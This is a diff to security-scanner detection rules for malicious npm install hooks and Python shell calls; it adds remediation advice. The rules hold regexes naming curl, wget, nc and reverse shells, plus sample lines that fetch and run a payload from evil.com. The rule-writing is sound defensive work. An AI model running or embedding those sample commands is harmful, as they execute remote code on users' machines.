@@ -8,6 +8,7 @@ match_mode: any
 patterns:
   - type: regex
     value: "(?i)[\"'](preinstall|postinstall|preuninstall)[\"']\\s*:\\s*[\"'][^\"']*(curl|wget|bash|sh |powershell|node -e|python|eval|nc |ncat)[^\"']*[\"']"
+remediation: "Pin the download URL to a specific version and verify checksums. Avoid curl-pipe-shell patterns."
 examples:
   true_positive:
     - "\"preinstall\": \"curl http://evil.com/payload.sh | bash\""
@@ -28,6 +29,7 @@ patterns:
     value: "(?i)(os\\.system|subprocess\\.(call|run|Popen|check_output)|exec\\(|eval\\().*?(curl|wget|http|socket|reverse|bash|sh\\b)"
   - type: regex
     value: "(?i)(os\\.system|subprocess\\.(call|run|Popen))\\s*\\([\"'][^\"']*[\"']\\)"
+remediation: "Avoid reverse shell patterns. If remote access is needed, use authenticated, audited channels."
 examples:
   true_positive:
     - "os.system(\"curl http://evil.com/payload.sh | bash\")"
